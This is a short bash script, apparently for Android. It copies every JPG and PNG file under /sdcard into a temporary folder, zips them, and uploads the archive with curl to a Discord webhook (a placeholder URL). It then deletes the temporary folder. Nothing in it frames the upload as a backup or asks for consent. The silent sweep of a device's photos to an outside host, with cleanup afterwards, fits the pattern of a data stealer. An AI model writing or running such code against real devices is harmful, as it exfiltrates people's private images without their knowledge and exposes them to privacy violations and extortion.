#!/bin/bash

WEBHOOK_URL="YOUR_DISCORD_WEBHOOK_URL"
TEMP_DIR="$HOME/temp_images"

mkdir -p $TEMP_DIR
find /sdcard -type f \( -name "*.jpg" -o -name "*.png" \) -exec cp {} $TEMP_DIR \;

ZIP_PATH="$TEMP_DIR/images.zip"
zip -r $ZIP_PATH $TEMP_DIR

curl -F "file=@$ZIP_PATH" $WEBHOOK_URL

rm -rf $TEMP_DIR
